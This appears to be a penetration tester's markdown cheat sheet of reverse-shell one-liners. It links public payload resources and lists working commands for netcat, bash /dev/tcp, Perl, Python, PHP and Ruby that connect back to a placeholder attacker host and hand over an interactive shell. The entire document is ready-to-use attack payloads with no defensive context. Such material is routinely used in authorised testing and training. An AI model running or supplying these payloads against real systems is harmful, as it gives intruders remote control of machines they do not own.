# Reserve Shell Cheat Sheet

Resources:
- https://weibell.github.io/reverse-shell-generator/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

netcat:

```
nc -e /bin/sh x.x.x.x 4444
```

netcat Windows:

```
nc.exe x.x.x.x 4444 –e cmd.exe
```

netcat without -e:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.X 4444 >/tmp/f
```

Bash:

```
bash -i >& /dev/tcp/x.x.x.x/8080 0>&1  
```

```
setsid bash -i &>/dev/tcp/x.x.x.x/8080 0>&1 &
```

Perl:

```
perl -e 'use Socket;$i="x.x.x.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  
```

Python:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

php:

```
php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

ruby:

```
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```